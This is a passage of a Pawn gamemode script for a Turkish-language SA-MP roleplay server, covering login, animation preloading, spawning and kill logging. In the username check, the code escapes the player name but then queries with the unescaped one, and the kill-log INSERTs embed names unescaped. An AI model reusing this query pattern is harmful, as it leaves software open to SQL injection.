	// Display the main menu
	ShowMainMenuGUI(playerid);
	ClearChatbox(playerid);
	SetPlayerVirtualWorld(playerid, 0);

	InterpolateCameraPos(playerid, 1559.903442, -891.754272, 111.488594, 1019.502197, -864.464843, 132.766082, 20000);
	InterpolateCameraLookAt(playerid, 1556.704467, -888.006164, 110.641143, 1023.095825, -862.652221, 129.799560, 20000);

	new
	    szQuery[128],
	    szPlayerName[MAX_PLAYER_NAME],
		szPlayerName2[MAX_PLAYER_NAME];

	GetPlayerName(playerid, szPlayerName, sizeof(szPlayerName));

	mysql_real_escape_string(szPlayerName, szPlayerName2, g_MySQLConnections[0]);

	// Check MySQL to see if any accounts exist with the specified username on login.
	format(szQuery, sizeof(szQuery), "SELECT COUNT(*) FROM players WHERE Username = '%s'", szPlayerName);
	mysql_query(szQuery, THREAD_CONFIRM_USERNAME, playerid, g_MySQLConnections[0]);



	//ConnectionLog(playerid, PlayerInfo[playerid][pID], szPlayerName);
	return 1;
}

stock PreloadAnimLib(playerid, animlib[]) {
	return ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
}

stock PreloadAnims(playerid) {
	ApplyAnimation(playerid, "AIRPORT", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "Attractors", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BAR", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BASEBALL", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BD_FIRE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BEACH", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "benchpress", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BF_injection", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BIKED", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BIKEH", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BIKELEAP", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BIKES", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BIKEV", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BIKE_DBZ", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BMX", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BOMBER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BOX", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BSKTBALL", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BUDDY", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BUS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CAMERA", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CAR", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CARRY", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CAR_CHAT", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CASINO", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CHAINSAW", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CHOPPA", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CLOTHES", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "COACH", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "COLT45", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "COP_AMBIENT", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "COP_DVBYZ", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CRACK", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CRIB", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DAM_JUMP", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DANCING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DEALER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DILDO", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DODGE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DOZER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DRIVEBYS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FAT", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FIGHT_B", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FIGHT_C", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FIGHT_D", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FIGHT_E", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FINALE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FINALE2", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FLAME", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "Flowers", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FOOD", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "Freeweights", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GANGS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GHANDS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GHETTO_DB", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "goggles", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GRAFFITI", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GRAVEYARD", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GRENADE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GYMNASIUM", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "HAIRCUTS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "HEIST9", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "INT_HOUSE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "INT_OFFICE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "INT_SHOP", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "JST_BUISNESS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "KART", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "KISSING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "KNIFE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "LAPDAN1", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "LAPDAN2", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "LAPDAN3", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "LOWRIDER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MD_CHASE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MD_END", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MEDIC", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MISC", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MTB", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MUSCULAR", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "NEVADA", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "ON_LOOKERS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "OTB", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "PARACHUTE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "PARK", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "PAULNMAC", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "ped", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "PLAYER_DVBYS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "PLAYIDLES", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "POLICE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "POOL", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "POOR", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "PYTHON", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "QUAD", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "QUAD_DBZ", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "RAPPING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "RIFLE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "RIOT", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "ROB_BANK", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "RUSTLER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "RYDER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SCRATCHING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SHAMAL", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SHOP", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SHOTGUN", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SILENCED", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SKATE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SMOKING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SNIPER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SPRAYCAN", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "STRIP", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SUNBATHE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SWAT", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SWEET", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SWIM", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SWORD", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "TANK", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "TATTOOS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "TEC", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "TRAIN", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "TRUCK", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "UZI", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "VAN", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "VENDING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "VORTEX", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "WAYFARER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "WEAPONS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "WUZI", "null", 0.0, 0, 0, 0, 0, 0);

	return 1;
}

forward RespawnVehicleFunction(vehicleid);
public RespawnVehicleFunction(vehicleid) {
	return SetVehicleToRespawn(vehicleid);
}

public OnPlayerSpawn(playerid) {
	PreloadAnims(playerid);

	SetPlayerTeam(playerid, -1);

	if(!gPlayerLogged[playerid])
    {// The player doesn't actually spawn before logging in, this is just to get rid of the annoying "<<", ">>" and "Spawn" buttons in the login/registration screen.
        TogglePlayerControllable(playerid, 0);
        return 1;
	}
	if(InsideShamal[playerid] != INVALID_VEHICLE_ID)
	{
		SetPlayerPos(playerid, GetPVarFloat(playerid, "air_Xpos"), GetPVarFloat(playerid, "air_Ypos"), GetPVarFloat(playerid, "air_Zpos"));
		SetPlayerFacingAngle(playerid, GetPVarFloat(playerid, "air_Rpos"));
		SetPlayerHealth(playerid, GetPVarFloat(playerid, "air_HP"));
		SetPlayerArmourEx(playerid, GetPVarFloat(playerid, "air_Arm"));
		SetPlayerWeaponsEx(playerid);
		SetPlayerToTeamColor(playerid);
		SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);

		DeletePVar(playerid, "air_Xpos");
		DeletePVar(playerid, "air_Ypos");
		DeletePVar(playerid, "air_Zpos");
		DeletePVar(playerid, "air_Rpos");
		DeletePVar(playerid, "air_HP");
		DeletePVar(playerid, "air_Arm");

		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, InsideShamal[playerid]);
		return SetPlayerInterior(playerid, 1);
	}

	if(KontrolEdildi[playerid] == 0) {
	KontrolEdildi[playerid] = 1;
	SetCameraBehindPlayer(playerid);
	TogglePlayerControllable(playerid,0);
	SetTimerEx("KontrolEdiver",4 * 1000, 0, "i", playerid);
	}

    Streamer_Update(playerid);

    if(IsPlayerNPC(playerid)) return 1;
	SetPlayerWantedLevel(playerid, PlayerInfo[playerid][pWantedLevel]);
	DeletePVar(playerid, "STD");

	SetCameraBehindPlayer(playerid);
	SetPlayerSpawn(playerid);
	SetPlayerWeapons(playerid);
	SetPlayerToTeamColor(playerid);

	SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, 1);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_MICRO_UZI, 1);
	TextDrawHideForPlayer(playerid, ZhaoByMetehan0);
	TextDrawHideForPlayer(playerid, ZhaoByMetehan1);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan2);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan3);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan4);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan5);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan6);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan7);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan8);
	TextDrawHideForPlayer(playerid, ZhaoByMetehan9);
	TextDrawHideForPlayer(playerid, ZhaoByMetehan10);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan11);
	TextDrawShowForPlayer(playerid, bilgilen);
	TextDrawShowForPlayer(playerid, mete0);
	TextDrawShowForPlayer(playerid, mete1);
	TextDrawShowForPlayer(playerid, mete2);
	TextDrawShowForPlayer(playerid, mete3);
	TextDrawShowForPlayer(playerid, mete4);
	TextDrawShowForPlayer(playerid, mete5);
	TextDrawShowForPlayer(playerid, mete6);
	TextDrawShowForPlayer(playerid, mete7);
	TextDrawShowForPlayer(playerid, mete8);
	TextDrawShowForPlayer(playerid, mete9);
	TextDrawShowForPlayer(playerid, mete10);
	TextDrawShowForPlayer(playerid, mete11);
	TextDrawShowForPlayer(playerid, mete12);
	TextDrawShowForPlayer(playerid, mete13);
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason){
	/*
    new Float:x,Float:y,Float:z,string[256],pName[MAX_PLAYER_NAME];
	GetPlayerPos(playerid, x,y,z);
	GetPlayerName(playerid, pName,sizeof(pName));
	format(string, sizeof(string),"Body of %s",pName);
	Create3DTextLabel(string, 0xFF0000FF,x,y,z-1,5,0,0);
	Object[playerid] = CreateObject(3092, x,y,z+1, 0.0, 0.0, 0.0,100.0);
	SetTimer("DestroyObject",5000,0);
	*/
    //new string[128];
    new string[256];

	if(IsPlayerConnected(killerid)) {
		new
			hour,
			minute,
			second,
			weaponname[32];

		gettime(hour,minute,second);
		FixHour(hour);
		hour = shifthour;
		GetWeaponName(reason, weaponname, sizeof(weaponname));

		new
			szQuery[225];

	    if(GetPVarInt(playerid, "PBM") > 0 && GetPVarInt(killerid, "PBM") > 0) {
        	SetPVarInt(killerid, "PBMK", GetPVarInt(killerid, "PBMK")+1);
        	SetPVarInt(playerid, "PBMD", GetPVarInt(playerid, "PBMD")+1);

        	SetPVarInt(playerid, "PBMS", GetPVarInt(playerid, "PBMS")-5);
        	SetPVarInt(killerid, "PBMS", GetPVarInt(killerid, "PBMS")+10);
			if(reason == 0) format(string, sizeof(string), "%s, %s adlý kiþiyi paintballda yumruklarýyla öldürdü.", GetPlayerNameEx(killerid), GetPlayerNameEx(playerid));
			else format(string, sizeof(string), "%s, %s adlý kiþiyi paintballda %s ile öldürdü.", GetPlayerNameEx(killerid), GetPlayerNameEx(playerid), weaponname);
			foreach(Player, i) {
			    if(GetPVarInt(playerid, "PBM") == GetPVarInt(i, "PBM"))
			        SendClientMessage(i, COLOR_RED, string);
			}

			format(PlayerInfo[playerid][pKillLog9], 128, "%s", PlayerInfo[playerid][pKillLog8]);
			format(PlayerInfo[playerid][pKillLog8], 128, "%s", PlayerInfo[playerid][pKillLog7]);
			format(PlayerInfo[playerid][pKillLog7], 128, "%s", PlayerInfo[playerid][pKillLog6]);
			format(PlayerInfo[playerid][pKillLog6], 128, "%s", PlayerInfo[playerid][pKillLog5]);
			format(PlayerInfo[playerid][pKillLog5], 128, "%s", PlayerInfo[playerid][pKillLog4]);
			format(PlayerInfo[playerid][pKillLog4], 128, "%s", PlayerInfo[playerid][pKillLog3]);
			format(PlayerInfo[playerid][pKillLog3], 128, "%s", PlayerInfo[playerid][pKillLog2]);
			format(PlayerInfo[playerid][pKillLog2], 128, "%s", PlayerInfo[playerid][pKillLog1]);
			format(PlayerInfo[playerid][pKillLog1], 128, "%s", PlayerInfo[playerid][pKillLog0]);
			format(PlayerInfo[playerid][pKillLog0], 128, "(%d:%d:%d) %s beni %s ile öldürdü. (paintballda)", hour,minute,second,GetPlayerNameEx(killerid), weaponname);

			format(PlayerInfo[killerid][pKillLog9], 128, "%s", PlayerInfo[killerid][pKillLog8]);
			format(PlayerInfo[killerid][pKillLog8], 128, "%s", PlayerInfo[killerid][pKillLog7]);
			format(PlayerInfo[killerid][pKillLog7], 128, "%s", PlayerInfo[killerid][pKillLog6]);
			format(PlayerInfo[killerid][pKillLog6], 128, "%s", PlayerInfo[killerid][pKillLog5]);
			format(PlayerInfo[killerid][pKillLog5], 128, "%s", PlayerInfo[killerid][pKillLog4]);
			format(PlayerInfo[killerid][pKillLog4], 128, "%s", PlayerInfo[killerid][pKillLog3]);
			format(PlayerInfo[killerid][pKillLog3], 128, "%s", PlayerInfo[killerid][pKillLog2]);
			format(PlayerInfo[killerid][pKillLog2], 128, "%s", PlayerInfo[killerid][pKillLog1]);
			format(PlayerInfo[killerid][pKillLog1], 128, "%s", PlayerInfo[killerid][pKillLog0]);
		 	format(PlayerInfo[killerid][pKillLog0], 128, "(%d:%d:%d) %s, %s adlý oyuncuyu %s ile öldürdü. (paintballda)", hour,minute,second, GetPlayerNameEx(killerid), GetPlayerNameEx(playerid), weaponname);

		 	format(szQuery, sizeof(szQuery), "INSERT INTO kills (killerID, killedID, killTS, killText) VALUES(%d, %d, %d, '%s')", PlayerInfo[killerid][pID], PlayerInfo[playerid][pID], gettime(), PlayerInfo[killerid][pKillLog0]);
		 	mysql_query(szQuery, THREAD_NO_RESULT, 0, g_MySQLConnections[0]);
	    } else if(GetPVarInt(playerid, "EventToken") > 0) {
			format(PlayerInfo[playerid][pKillLog9], 128, "%s", PlayerInfo[playerid][pKillLog8]);
			format(PlayerInfo[playerid][pKillLog8], 128, "%s", PlayerInfo[playerid][pKillLog7]);
			format(PlayerInfo[playerid][pKillLog7], 128, "%s", PlayerInfo[playerid][pKillLog6]);
			format(PlayerInfo[playerid][pKillLog6], 128, "%s", PlayerInfo[playerid][pKillLog5]);
			format(PlayerInfo[playerid][pKillLog5], 128, "%s", PlayerInfo[playerid][pKillLog4]);
			format(PlayerInfo[playerid][pKillLog4], 128, "%s", PlayerInfo[playerid][pKillLog3]);
			format(PlayerInfo[playerid][pKillLog3], 128, "%s", PlayerInfo[playerid][pKillLog2]);
			format(PlayerInfo[playerid][pKillLog2], 128, "%s", PlayerInfo[playerid][pKillLog1]);
			format(PlayerInfo[playerid][pKillLog1], 128, "%s", PlayerInfo[playerid][pKillLog0]);
			format(PlayerInfo[playerid][pKillLog0], 128, "(%d:%d:%d) %s beni %s ile öldürdü. (etkinlikte)", hour,minute,second,GetPlayerNameEx(killerid), weaponname);

			format(PlayerInfo[killerid][pKillLog9], 128, "%s", PlayerInfo[killerid][pKillLog8]);
			format(PlayerInfo[killerid][pKillLog8], 128, "%s", PlayerInfo[killerid][pKillLog7]);
			format(PlayerInfo[killerid][pKillLog7], 128, "%s", PlayerInfo[killerid][pKillLog6]);
			format(PlayerInfo[killerid][pKillLog6], 128, "%s", PlayerInfo[killerid][pKillLog5]);
			format(PlayerInfo[killerid][pKillLog5], 128, "%s", PlayerInfo[killerid][pKillLog4]);
			format(PlayerInfo[killerid][pKillLog4], 128, "%s", PlayerInfo[killerid][pKillLog3]);
			format(PlayerInfo[killerid][pKillLog3], 128, "%s", PlayerInfo[killerid][pKillLog2]);
			format(PlayerInfo[killerid][pKillLog2], 128, "%s", PlayerInfo[killerid][pKillLog1]);
			format(PlayerInfo[killerid][pKillLog1], 128, "%s", PlayerInfo[killerid][pKillLog0]);
		 	format(PlayerInfo[killerid][pKillLog0], 128, "(%d:%d:%d) %s, %s adlý oyuncuyu %s ile öldürdü. (etkinlikte)", hour,minute,second, GetPlayerNameEx(killerid), GetPlayerNameEx(playerid), weaponname);

		 	format(szQuery, sizeof(szQuery), "INSERT INTO kills (killerID, killedID, killTS, killText) VALUES(%d, %d, %d, '%s')", PlayerInfo[killerid][pID], PlayerInfo[playerid][pID], gettime(), PlayerInfo[killerid][pKillLog0]);
		 	mysql_query(szQuery, THREAD_NO_RESULT, 0, g_MySQLConnections[0]);
	    } else {
			format(PlayerInfo[playerid][pKillLog9], 128, "%s", PlayerInfo[playerid][pKillLog8]);
			format(PlayerInfo[playerid][pKillLog8], 128, "%s", PlayerInfo[playerid][pKillLog7]);
			format(PlayerInfo[playerid][pKillLog7], 128, "%s", PlayerInfo[playerid][pKillLog6]);
			format(PlayerInfo[playerid][pKillLog6], 128, "%s", PlayerInfo[playerid][pKillLog5]);
			format(PlayerInfo[playerid][pKillLog5], 128, "%s", PlayerInfo[playerid][pKillLog4]);
			format(PlayerInfo[playerid][pKillLog4], 128, "%s", PlayerInfo[playerid][pKillLog3]);
			format(PlayerInfo[playerid][pKillLog3], 128, "%s", PlayerInfo[playerid][pKillLog2]);
			format(PlayerInfo[playerid][pKillLog2], 128, "%s", PlayerInfo[playerid][pKillLog1]);
			format(PlayerInfo[playerid][pKillLog1], 128, "%s", PlayerInfo[playerid][pKillLog0]);
			format(PlayerInfo[playerid][pKillLog0], 128, "(%d:%d:%d) %s beni %s ile öldürdü.", hour,minute,second,GetPlayerNameEx(killerid), weaponname);

			format(PlayerInfo[killerid][pKillLog9], 128, "%s", PlayerInfo[killerid][pKillLog8]);
			format(PlayerInfo[killerid][pKillLog8], 128, "%s", PlayerInfo[killerid][pKillLog7]);
			format(PlayerInfo[killerid][pKillLog7], 128, "%s", PlayerInfo[killerid][pKillLog6]);
			format(PlayerInfo[killerid][pKillLog6], 128, "%s", PlayerInfo[killerid][pKillLog5]);
			format(PlayerInfo[killerid][pKillLog5], 128, "%s", PlayerInfo[killerid][pKillLog4]);
			format(PlayerInfo[killerid][pKillLog4], 128, "%s", PlayerInfo[killerid][pKillLog3]);
			format(PlayerInfo[killerid][pKillLog3], 128, "%s", PlayerInfo[killerid][pKillLog2]);
			format(PlayerInfo[killerid][pKillLog2], 128, "%s", PlayerInfo[killerid][pKillLog1]);
			format(PlayerInfo[killerid][pKillLog1], 128, "%s", PlayerInfo[killerid][pKillLog0]);
			if(JustSuicided[playerid]) {
				JustSuicided[playerid] = 0;
				format(PlayerInfo[killerid][pKillLog0], 128, "(%d:%d:%d) %s intahar etti.", hour,minute,second, GetPlayerNameEx(killerid));
			} else {
				format(PlayerInfo[killerid][pKillLog0], 128, "(%d:%d:%d) %s, %s adlý oyuncuyu %s ile öldürdü.", hour,minute,second, GetPlayerNameEx(killerid), GetPlayerNameEx(playerid), weaponname);
			}

		 	format(szQuery, sizeof(szQuery), "INSERT INTO kills (killerID, killedID, killTS, killText) VALUES(%d, %d, %d, '%s')", PlayerInfo[killerid][pID], PlayerInfo[playerid][pID], gettime(), PlayerInfo[killerid][pKillLog0]);
		 	mysql_query(szQuery, THREAD_NO_RESULT, 0, g_MySQLConnections[0]);
	 	}
	} else {
	    if(GetPVarInt(playerid, "PBM") > 0) {
			format(string, sizeof(string), "%s adlý kiþi öldü.", GetPlayerNameEx(playerid));
			foreach(Player, i) {
			    if(GetPVarInt(playerid, "PBM") == GetPVarInt(i, "PBM"))
			        SendClientMessage(i, COLOR_RED, string);
			}
		}
	}

	if(GetPVarType(playerid, "SpecOff"))
	{
		SpawnPlayer(playerid);
		return 1;
	}

	if(PlayerDraggedBy[playerid] != INVALID_PLAYER_ID) {
		IsCopDragging[PlayerDraggedBy[playerid]] = INVALID_PLAYER_ID;
	}

	if(IsPlayerAttachedObjectSlotUsed(playerid, 0))
		RemovePlayerAttachedObject(playerid, 0);

	pTazer[playerid] = 0;
	InsideShamal[playerid] = INVALID_VEHICLE_ID;
	DeletePVar(playerid, "Hiz Radari");
 	DeletePVar(playerid, "UsingSprunk");
	DeletePVar(playerid, "usingfirstaid");
	KillTimer(GetPVarInt(playerid, "firstaid5"));
	PlayerCuffed[playerid] = 0;
	PlayerCuffedTime[playerid] = 0;
	DeletePVar(playerid, "PlayerCuffed");
	IsCopDragging[playerid] = INVALID_PLAYER_ID;
	PlayerDraggedBy[playerid] = INVALID_PLAYER_ID;
	PlayerDragged[playerid] = 0;

	if(GetPVarInt(playerid, "Injured") == 1)
	{
     	SendClientMessage(playerid, COLOR_WHITE, "Belirsizlik içinde sýkýþtýn, doktorlar seni kurtaramadý.");
 		KillEMSQueue(playerid);
	    ResetPlayerWeaponsEx(playerid);

   		new Float:X, Float:Y, Float:Z;
		new Float:health;
		GetPlayerHealth(playerid, health);
		SetPlayerHealth(playerid, health-5);
		GetPlayerPos(playerid, X, Y, Z);
		SetPlayerPos(playerid, X, Y, Z+5);
	    return 1;
	}

	// Determine if the player is in onplayerdeath
	SetPVarInt(playerid, "OPD", 1);

	if(GetPVarInt(playerid, "MovingStretcher") != -1)
	{
	    KillTimer(GetPVarInt(playerid, "TickEMSMove"));
	    DeletePVar(GetPVarInt(playerid, "MovingStretcher"), "OnStretcher");
	    SetPVarInt(playerid, "MovingStretcher", -1);
	}

	if(IsPlayerConnected(Mobile[playerid]))
	{
		SendClientMessage(Mobile[playerid],  COLOR_GRAD2, "Hat kesildi.");
		format(string, sizeof(string), "* %s telefonu kaldýrdý.", GetPlayerNameEx(Mobile[playerid]));
		ProxDetector(30.0, Mobile[playerid], string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		CellTime[Mobile[playerid]] = 0;
		Mobile[Mobile[playerid]] = INVALID_PLAYER_ID;
	}
	Mobile[playerid] = INVALID_PLAYER_ID;
	CellTime[playerid] = 0;

	foreach(Player, i)
	{
		if(EMSAccepted[i] == playerid)
		{
			EMSAccepted[i] = INVALID_PLAYER_ID;
			GameTextForPlayer(i, "~w~Ambulans Cagiran Hayatini~n~~r~Kaybetti", 5000, 1);
			EMSCallTime[i] = 0;
			DisablePlayerCheckpoint(i);
		}
	}

	if(GetPVarInt(playerid, "EventToken") == 0)
	{
	    if(GetPVarInt(playerid, "PBM") < 1)
		{
		    if(PlayerInfo[playerid][pJailTime] == 0)
		    {
				new Float:X, Float:Y, Float:Z;
				GetPlayerPos(playerid, X, Y, Z);
				SetSpawnInfo(playerid, 0, PlayerInfo[playerid][pSkin], X, Y, Z, 1.0, -1, -1, -1, -1, -1, -1);

		    	if(AdminDuty[playerid] != 1 && GetPVarType(playerid, "posX") == 0)
		    	{
					SetPVarInt(playerid, "Injured", 1);

					new Float:mX, Float:mY, Float:mZ;
					GetPlayerPos(playerid, mX, mY, mZ);

					SetPVarFloat(playerid, "MedicX", mX);
					SetPVarFloat(playerid, "MedicY", mY);
					SetPVarFloat(playerid, "MedicZ", mZ);
					SetPVarInt(playerid, "MedicVW", GetPlayerVirtualWorld(playerid));
					SetPVarInt(playerid, "MedicInt", GetPlayerInterior(playerid));
		    	}
		    	else
		    	{
					if(GetPVarType(playerid, "posX") != 0)
						return SpawnPlayer(playerid);

					SetPVarInt(playerid, "AdminDeathVW", GetPlayerVirtualWorld(playerid));
